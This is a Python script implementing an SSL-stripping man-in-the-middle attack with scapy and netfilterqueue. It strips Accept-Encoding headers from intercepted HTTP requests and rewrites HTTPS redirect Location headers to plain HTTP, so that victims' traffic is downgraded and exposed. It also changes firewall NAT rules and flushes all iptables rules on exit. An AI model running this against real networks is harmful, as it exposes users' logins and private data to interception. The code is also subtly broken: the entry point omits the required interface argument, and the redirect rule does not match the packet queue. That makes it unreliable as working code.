import netfilterqueue
from scapy.all import *
import re
import os

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load.decode(errors="ignore")
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[TCP].sport == 80:
                print("[+] Response")
                load = re.sub("Location: https://", "Location: http://", load)

        if load != scapy_packet[Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()

def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def ssl_strip(interface):
    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        queue.run()
    except Exception as e:
        print("Error: {}".format(e))
        queue.unbind()
    finally:
        os.system("iptables --flush")

if __name__ == "__main__":
    ssl_strip()
